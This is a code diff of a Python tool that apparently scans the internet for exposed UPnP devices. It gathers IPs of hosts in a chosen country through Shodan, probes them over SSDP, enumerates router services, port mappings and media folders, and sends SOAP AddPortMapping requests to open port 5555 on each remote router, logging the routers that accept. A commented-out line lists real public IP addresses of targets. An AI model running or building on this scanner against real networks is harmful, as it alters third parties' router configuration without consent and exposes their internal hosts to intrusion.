@@ -34,9 +34,11 @@ def get_arguments():
 def get_vuln_ips(country):
     if os.geteuid() != 0:
         exit('Root priveleges required')
-    print('\033[96m' + '---------------------------\n' + ' Obtaining IP addresses with open \n 1900 port in the specified country\r\n' +'---------------------------')
-    os.system(f'''shodan download --limit 100 {country} "port:1900 country:{country}"''')
-    os.system(f"shodan parse {country}.json.gz --fields ip_str > {country}.txt")
+    print('\033[96m' + '---------------------------\n' + ' Obtaining IP addresses with open \n 1900 port in the specified country\r\n' + '---------------------------')
+    os.system(f'''shodan download --limit 100 {country} "port:1900 \
+        country:{country}"''')
+    os.system(f"shodan parse {country}.json.gz --fields ip_str > \
+        {country}.txt")
 
 
 ###
@@ -56,22 +58,21 @@ def get_ips_from_file(hostsFile):
 ###
 def port_forwarding(input_file):
     print('\033[96m' + '---------------------------\n' + 'Port forwarding\r\n' +'---------------------------')
-    with open(input_file, "r", encoding="utf-8") as f:
-        for line in f:
-            ip = line.strip().split(':')[1]
-            port = line.strip().split(':')[2].split('/')[0]
+    with open(input_file, "r", encoding="utf-8") as file:
+        for line in file:
+            ip = line.strip().split(':')[0]
+            port = line.strip().split(':')[1].split('/')[0]
             ip_with_port = ip + ':' + port
-            # print(line.strip())
 
             try:
-                soup = BeautifulSoup(requests.get(line.strip()).text, 'lxml')
+                soup = BeautifulSoup(requests.get("http://" + line.strip(), timeout=1).text, 'lxml')
                 controlurl = soup.find('devicelist').find('devicelist').find('controlurl').get_text()
-                localip = soup.find('presentationurl').get_text()[7:18]
-                soapAddActionHeader = { 'Soapaction' : '"' + 'rn:schemas-upnp-org:services:WANIPConnection:1#AddPortMapping' + '"',
+                local_IP = soup.find('presentationurl').get_text()[7:18]
+                SOAP_add_action_header = { 'Soapaction' : '"' + 'rn:schemas-upnp-org:services:WANIPConnection:1#AddPortMapping' + '"',
                      'Content-type' : 'text/xml; charset="utf-8"',
                      'Connection' : 'close' }
 
-                soapDeleteActionHeader = { 'Soapaction' : '"' + 'rn:schemas-upnp-org:services:WANIPConnection:1#DeletePortMapping' + '"',
+                SOAP_delete_action_header = { 'Soapaction' : '"' + 'rn:schemas-upnp-org:services:WANIPConnection:1#DeletePortMapping' + '"',
                          'Content-type' : 'text/xml; charset="utf-8"',
                          'Connection' : 'close' }
 
@@ -81,7 +82,7 @@ def port_forwarding(input_file):
                            '<u:AddPortMapping xmlns:u="' + "urn:schemas-upnp-org:services:WANIPConnection:1" + '">' +
                            '<NewRemoteHost></NewRemoteHost>' +
                            '<NewExternalPort>5555</NewExternalPort>' +
-                           f"<NewInternalClient>{localip}</NewInternalClient>" +
+                           f"<NewInternalClient>{local_IP}</NewInternalClient>" +
                            '<NewInternalPort>80</NewInternalPort>'+
                            '<NewProtocol>TCP</NewProtocol>' +
                            '<NewPortMappingDescription>test</NewPortMappingDescription>' +
@@ -90,23 +91,26 @@ def port_forwarding(input_file):
                            '</u:AddPortMapping>' +
                            '</s:Body>' +
                            '</s:Envelope>')
-                # print(f"http:{ip_with_port}{controlurl}")
-                resp = requests.post(f"http:{ip_with_port}{controlurl}", \
-                    data=payload, headers=soapAddActionHeader)
-                print(resp.status_code)
+
+                resp = requests.post(f"http://{ip_with_port}{controlurl}", \
+                    data=payload, headers=SOAP_add_action_header, timeout=1)
                 if resp.status_code != 200:
-                    print('[-] ' + ip + ' is not vulnerable for port forwarding')
+                    print('\033[92m' + '[-] http:' + ip + ' is not vulnerable for port forwarding')
                 else:
-                    print('[+] ' + ip + ' is vulnerable for port forwarding')
-                    with open('port_forward_output.txt', "c", encoding="utf-8") as f:
+                    print('\u001b[36m' + '[+] http:' + ip + ' is vulnerable for port forwarding')
+                    with open('port_forward_output.txt', "a", encoding="utf-8") as f:
                         f.write(ip + '\n')
 
-                resp = requests.post(f"http:{ip_with_port}{controlurl}", \
-                        data=payload, headers=soapDeleteActionHeader)
-            except Exception:
-                print('[-] http:' + ip + ' is not vulnerable for port forwarding')
+                resp = requests.post(f"http://{ip_with_port}{controlurl}", \
+                        data=payload, headers=SOAP_delete_action_header)                
+            except Exception as e:
+                print('\033[92m' + '[-] http:' + ip + ' is not vulnerable for port forwarding')
                 continue
-    print('\u001b[36m' + '---------------------------\nsee port_forward_output.txt file to see hosts vulnerable for port forwarding\n' + '---------------------------')
+    try:
+        f = open("port_forward_output.txt")
+        print('\u001b[36m' + '---------------------------\n See port_forward_output.txt file to see hosts vulnerable for port forwarding\n' + '---------------------------')
+    except FileNotFoundError:
+        print('\u001b[36m' + '---------------------------\n No hosts vulnerable for port forwarding has been found\n' + '---------------------------')
 
 
 ###
@@ -123,7 +127,7 @@ def discover_upnp_locations(hostsFile, outputFile):
     print('\033[92m' + '---------------------------\n Discovering upnp locations\r\n---------------------------')
     location_regex = re.compile("location:[ ]*(.+)\r\n", re.IGNORECASE)
     port_and_xml_regex = re.compile(":\d{1,5}/.{1,25}", re.IGNORECASE)
-    ssdpDiscover = ('M-SEARCH * HTTP/1.1\r\n' +
+    SSDP_discover = ('M-SEARCH * HTTP/1.1\r\n' +
                     'HOST: 239.255.255.250:1900\r\n' +
                     'MAN: "ssdp:discover"\r\n' +
                     'MX: 1\r\n' +
@@ -135,33 +139,32 @@ def discover_upnp_locations(hostsFile, outputFile):
     for host in hosts:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.sendto(ssdpDiscover.encode('ASCII'), (host, 1900))
+            sock.sendto(SSDP_discover.encode('ASCII'), (host, 1900))
             sock.settimeout(1)
-            data, addr = sock.recvfrom(1024)  # buffer size is 1024 bytes
+            data, addr = sock.recvfrom(1024)  # размер буфера равен 1024 байтам
             location_result = location_regex.search(data.decode('ASCII'))
             if location_result is None or \
                     port_and_xml_regex.search(location_result.group(1)) is None:
                 print('[-] ' + host + ' : ' + 'has no location')
                 continue
 
-            fullUrl = 'http://' + host + port_and_xml_regex.search(location_result.group(1)).group(0)
-            print('[+] ' + host + ' : ' + 'location is accessible')
-            locations.add(fullUrl)
+            fullUrl = host + port_and_xml_regex.search(location_result.group(1)).group(0)
+            print('\u001b[36m' + '[+] ' + host + ' : ' + 'location is accessible')
+            locations.add('http://' + fullUrl)
             with open(outputFile, "a", encoding="utf-8") as f:
                 f.write(fullUrl + '\n')
         except socket.error:
-            print('[-] ' + host + ' : ' + 'location is not accessible')
+            print('\033[92m' + '[-] ' + host + ' : ' + 'location is not accessible')
             continue
-    # print(locations)
-    locations = {'http://117.56.85.104:49152/edevicedesc.xml', 'http://59.125.79.48:1900/rootDesc.xml', 'http://117.56.64.173:6432/description.xml', 'http://117.56.226.98:49152/edevicedesc.xml', 'http://220.130.140.172:1900/rootDesc.xml', 'http://220.132.196.135:54230/rootDesc.xml', 'http://59.120.154.27:1900/rootDesc.xml'}
+
+    # locations = {'http://117.56.85.104:49152/edevicedesc.xml', 'http://59.125.79.48:1900/rootDesc.xml', 'http://117.56.64.173:6432/description.xml', 'http://117.56.226.98:49152/edevicedesc.xml', 'http://220.130.140.172:1900/rootDesc.xml', 'http://220.132.196.135:54230/rootDesc.xml', 'http://59.120.154.27:1900/rootDesc.xml'}
     print('---------------------------\n Discovery complete\n--------------------------')
-    print('[+] %d locations found:' % len(locations))
+    print('\u001b[36m' + '[+] %d locations found:' % len(locations))
     for location in locations:
         print('\t-> %s' % location)
     print('---------------------------')
     parse_locations(locations)
     print('\u001b[33m' + '---------------------------\n' + 'see ' + outputFile + ' file to see hosts with open xml configurations\r\n' +'---------------------------')
-    # return locations
 
 
 ###
@@ -203,18 +206,18 @@ def parse_locations(locations):
 
                 print('\t==== XML Attributes ===')
                 try:
-                    xmlRoot = ET.fromstring(resp.text)
+                    xml_root = ET.fromstring(resp.text)
                 except Exception:
                     print('\t[!] Failed XML parsing of %s' % location)
                     continue
 
-                print_attribute(xmlRoot, "./{urn:schemas-upnp-org:device-1-0}device/{urn:schemas-upnp-org:device-1-0}deviceType", "Device Type")
-                print_attribute(xmlRoot, "./{urn:schemas-upnp-org:device-1-0}device/{urn:schemas-upnp-org:device-1-0}friendlyName", "Friendly Name")
-                print_attribute(xmlRoot, "./{urn:schemas-upnp-org:device-1-0}device/{urn:schemas-upnp-org:device-1-0}manufacturer", "Manufacturer")
-                print_attribute(xmlRoot, "./{urn:schemas-upnp-org:device-1-0}device/{urn:schemas-upnp-org:device-1-0}manufacturerURL", "Manufacturer URL")
-                print_attribute(xmlRoot, "./{urn:schemas-upnp-org:device-1-0}device/{urn:schemas-upnp-org:device-1-0}modelDescription", "Model Description")
-                print_attribute(xmlRoot, "./{urn:schemas-upnp-org:device-1-0}device/{urn:schemas-upnp-org:device-1-0}modelName", "Model Name")
-                print_attribute(xmlRoot, "./{urn:schemas-upnp-org:device-1-0}device/{urn:schemas-upnp-org:device-1-0}modelNumber", "Model Number")
+                print_attribute(xml_root, "./{urn:schemas-upnp-org:device-1-0}device/{urn:schemas-upnp-org:device-1-0}deviceType", "Device Type")
+                print_attribute(xml_root, "./{urn:schemas-upnp-org:device-1-0}device/{urn:schemas-upnp-org:device-1-0}friendlyName", "Friendly Name")
+                print_attribute(xml_root, "./{urn:schemas-upnp-org:device-1-0}device/{urn:schemas-upnp-org:device-1-0}manufacturer", "Manufacturer")
+                print_attribute(xml_root, "./{urn:schemas-upnp-org:device-1-0}device/{urn:schemas-upnp-org:device-1-0}manufacturerURL", "Manufacturer URL")
+                print_attribute(xml_root, "./{urn:schemas-upnp-org:device-1-0}device/{urn:schemas-upnp-org:device-1-0}modelDescription", "Model Description")
+                print_attribute(xml_root, "./{urn:schemas-upnp-org:device-1-0}device/{urn:schemas-upnp-org:device-1-0}modelName", "Model Name")
+                print_attribute(xml_root, "./{urn:schemas-upnp-org:device-1-0}device/{urn:schemas-upnp-org:device-1-0}modelNumber", "Model Number")
 
                 igd_ctr = ''
                 igd_service = ''
@@ -224,7 +227,7 @@ def parse_locations(locations):
                 wps_service = ''
 
                 print('\t-> Services:')
-                services = xmlRoot.findall(".//*{urn:schemas-upnp-org:device-1-0}serviceList/")
+                services = xml_root.findall(".//*{urn:schemas-upnp-org:device-1-0}serviceList/")
                 for service in services:
                     print('\t\t=> Service Type: %s' % service.find('./{urn:schemas-upnp-org:device-1-0}serviceType').text)
                     print('\t\t=> Control: %s' % service.find('./{urn:schemas-upnp-org:device-1-0}controlURL').text)
@@ -240,12 +243,12 @@ def parse_locations(locations):
                     # read in the SCP XML
                     resp = requests.get(serviceURL, timeout=2)
                     try:
-                        serviceXML = ET.fromstring(resp.text)
+                        service_XML = ET.fromstring(resp.text)
                     except Exception:
                         print('\t\t\t[!] Failed to parse the response XML')
                         continue
 
-                    actions = serviceXML.findall(".//*{urn:schemas-upnp-org:service-1-0}action")
+                    actions = service_XML.findall(".//*{urn:schemas-upnp-org:service-1-0}action")
                     for action in actions:
                         print('\t\t\t- ' + action.find('./{urn:schemas-upnp-org:service-1-0}name').text)
                         if action.find('./{urn:schemas-upnp-org:service-1-0}name').text == 'AddPortMapping':
@@ -310,30 +313,32 @@ def find_port_mappings(p_url, p_service):
                    '</s:Body>' +
                    '</s:Envelope>')
 
-        soapActionHeader = { 'Soapaction' : '"' + p_service + '#GetGenericPortMappingEntry' + '"',
+        SOAP_action_header = { 'Soapaction' : '"' + p_service + '#GetGenericPortMappingEntry' + '"',
                              'Content-type' : 'text/xml;charset="utf-8"' }
-        resp = requests.post(p_url, data=payload, headers=soapActionHeader)
+        resp = requests.post(p_url, data=payload, headers=SOAP_action_header)
 
         if resp.status_code != 200:
-            print('\t[!] No existing port mappings found')
+            if index == 0:
+                print('\t[!] No existing port mappings found')
             return
         else:
             try:
-                xmlRoot = ET.fromstring(resp.text)
+                xml_root = ET.fromstring(resp.text)
             except Exception:
                 print('\t\t[!] Failed to parse the response XML')
                 return
 
-            externalIP = xmlRoot.find(".//*NewRemoteHost").text
-            if externalIP == None:
-                externalIP = '*'
+            external_IP = xml_root.find(".//*NewRemoteHost").text
+            if external_IP == None:
+                external_IP = '*'
 
-            print('\t\t[%s] %s:%s => %s:%s | Desc: %s' % (xmlRoot.find(".//*NewProtocol").text,
-                externalIP, xmlRoot.find(".//*NewExternalPort").text,
-                xmlRoot.find(".//*NewInternalClient").text, xmlRoot.find(".//*NewInternalPort").text,
-                xmlRoot.find(".//*NewPortMappingDescription").text))
+            print('\t\t[%s] %s:%s => %s:%s | Desc: %s' % (xml_root.find(".//*NewProtocol").text,
+                external_IP, xml_root.find(".//*NewExternalPort").text,
+                xml_root.find(".//*NewInternalClient").text, xml_root.find(".//*NewInternalPort").text,
+                xml_root.find(".//*NewPortMappingDescription").text))
 
         index += 1
+    
 
 
 ###
@@ -359,22 +364,22 @@ def find_directories(p_url, p_service):
                '</s:Body>' +
                '</s:Envelope>')
 
-    soapActionHeader = { 'Soapaction' : '"' + p_service + '#Browse' + '"',
+    SOAP_action_header = { 'Soapaction' : '"' + p_service + '#Browse' + '"',
                          'Content-type' : 'text/xml;charset="utf-8"' }
 
-    resp = requests.post(p_url, data=payload, headers=soapActionHeader)
+    resp = requests.post(p_url, data=payload, headers=SOAP_action_header)
     if resp.status_code != 200:
         print('\t\tRequest failed with status: %d' % resp.status_code)
         return
 
     try:
-        xmlRoot = ET.fromstring(resp.text)
-        containers = xmlRoot.find(".//*Result").text
+        xml_root = ET.fromstring(resp.text)
+        containers = xml_root.find(".//*Result").text
         if not containers:
             return
 
-        xmlRoot = ET.fromstring(containers)
-        containers = xmlRoot.findall("./{urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/}container")
+        xml_root = ET.fromstring(containers)
+        containers = xml_root.findall("./{urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/}container")
         for container in containers:
             if container.find("./{urn:schemas-upnp-org:metadata-1-0/upnp/}class").text.find("object.container") > -1:
                 print("\t\tStorage Folder: " + container.find("./{http://purl.org/dc/elements/1.1/}title").text)
@@ -399,10 +404,10 @@ def find_device_info(p_url, p_service):
                '</s:Body>' +
                '</s:Envelope>')
 
-    soapActionHeader = { 'Soapaction' : '"' + p_service + '#GetDeviceInfo' + '"',
+    SOAP_action_header = { 'Soapaction' : '"' + p_service + '#GetDeviceInfo' + '"',
                          'Content-type' : 'text/xml;charset="utf-8"' }
 
-    resp = requests.post(p_url, data=payload, headers=soapActionHeader)
+    resp = requests.post(p_url, data=payload, headers=SOAP_action_header)
     if resp.status_code != 200:
         print('\t[-] Request failed with status: %d' % resp.status_code)
         return
@@ -458,7 +463,6 @@ def main():
     elif args.input != None:
         if args.output == None:
             exit("Specify a file to record scan results")
-        print(args.discover)
         if args.discover != False:
             discover_upnp_locations(args.input, args.output)
         if args.port_forwarding != False:
